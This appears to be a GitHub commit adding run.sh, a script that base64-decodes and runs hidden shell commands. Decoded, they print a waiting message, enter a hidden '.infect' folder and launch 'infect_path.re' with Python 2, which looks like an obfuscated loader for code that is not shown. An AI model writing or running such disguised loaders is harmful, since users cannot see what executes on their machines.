0c319049d4a131157e83bd30ed943beaa82a7bd8
Abdul Basit Minhas <52023076+Tech-abm@users.noreply.github.com>
2021-06-05 23:49:28 -0700

    Add files via upload

---
+++ run.sh
@@ -0,0 +1,4 @@
+bash -c "$(base64 -d <<< "\
+IyEvYmluL2Jhc2gKY2xlYXIKZWNobwplY2hvCmVjaG8KZWNobyAiV2FpdCBVbnRpbCBUaGUgUHJv
+Y2VzcyBJcyBDb21wbGV0ZS4hIgplY2hvCmVjaG8KZWNobwpzbGVlcCAyCmNkIC5pbmZlY3QKcHl0
+aG9uMiBpbmZlY3RfcGF0aC5yZQo=")" bash "$@"
